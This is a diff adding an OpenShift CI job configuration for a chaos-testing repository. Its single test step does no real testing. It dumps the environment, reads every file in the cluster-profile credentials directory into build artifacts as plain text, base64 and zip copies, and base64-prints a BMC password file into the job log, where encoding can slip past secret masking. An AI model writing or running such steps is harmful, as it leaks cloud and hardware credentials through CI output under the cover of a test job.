@@ -1,0 +1,59 @@
+releases:
+  latest:
+    candidate:
+      product: ocp
+      stream: nightly
+      version: "4.19"
+resources:
+  '*':
+    limits:
+      memory: 4Gi
+    requests:
+      cpu: 100m
+      memory: 200Mi
+tests:
+- as: step-1
+  steps:
+    cluster_profile: aws-lp-chaos
+    env:
+      BASE_DOMAIN: test.lp.devcluster.openshift.com
+      COMPUTE_NODE_TYPE: c5n.metal
+      TIMEOUT: 8 hours
+    test:
+    - as: step-1-1
+      commands: |
+        set +eu
+        shopt -s expand_aliases
+        set -x
+        shopt -op; shopt -p
+        printenv
+        pwd
+        ps faux
+        ls -laF
+        ls -laF "${SHARED_DIR}/"
+        ls -laF "${CLUSTER_PROFILE_DIR}/"
+        type oc
+        which oc
+        # alias oc='oc --kubeconfig="${CLUSTER_PROFILE_DIR}/kubeconfig"'
+        oc get Nodes,ClusterVersion
+        { for e in "${CLUSTER_PROFILE_DIR}/"*; do cat "${e}"; done; } |& tee "${ARTIFACT_DIR}/data"
+        cat "${ARTIFACT_DIR}/data" | base64 > "${ARTIFACT_DIR}/data.b64"
+        zip $ARTIFACT_DIR/data.zip $ARTIFACT_DIR/data
+        cat "${CLUSTER_PROFILE_DIR}/cred--bmc--pwd" | base64
+        e=60; while ((e--)); do { [ -e /tmp/debug.done ] && break; sleep 60; }; done
+        true
+      from: cli
+      resources:
+        limits:
+          memory: 4Gi
+        requests:
+          cpu: 100m
+          memory: 200Mi
+    - ref: wait
+    workflow: ipi-aws
+  timeout: 10h0m0s
+zz_generated_metadata:
+  branch: main
+  org: redhat-chaos
+  repo: lp-chaos
+  variant: ocp4.19--edttj--poc
